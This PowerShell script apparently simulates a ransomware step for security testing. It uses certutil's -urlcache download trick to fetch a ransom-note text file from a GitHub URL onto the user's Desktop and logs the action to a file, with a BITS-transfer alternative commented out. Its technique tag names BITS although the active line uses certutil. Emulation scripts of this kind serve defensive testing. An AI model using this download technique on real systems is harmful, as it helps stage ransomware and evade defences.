# Donwload Ransom Note and stores it on User's Desktop 
# Technic ID : T1197
Clear-Host
Write-Output "==============================================================================="
Write-Output "Donwload RansomWare Note using Certutil (LolBin)"
Write-Output "==============================================================================="
#
$exf_file = "$env:PUBLIC\exf\Note_setup.txt";
$DownLoadSource = "https://github.com/JimBenna/fakedocs/raw/refs/heads/main/Ransomware_note.txt"
$DestDir = "$env:USERPROFILE\Desktop\"
$DestFile = "Ransomware_note.txt"
$FullDest = $DestDir + $DestFile
try {
    certutil -urlcache -f $DownLoadSource $FullDest
    #Start-BitsTransfer -Source $DownLoadSource -Destination $FullDest -DisplayName "Donwload Text File" -Description "Downloading a text File From the Internet" -Priority Foreground
    Write-Output "Downloaded the file from the URL : $DownLoadSource" | Out-File -FilePath "$exf_file" -Encoding ascii -Append
    Write-Output "File has been stored in : $FullDest" | Out-File -FilePath "$exf_file" -Encoding ascii -Append
    exit 0
}
catch {
    Write-Output "Error during Download : $($_.Exception.Message)" | Out-File -FilePath "$exf_file" -Encoding ascii -Append
    exit 1
}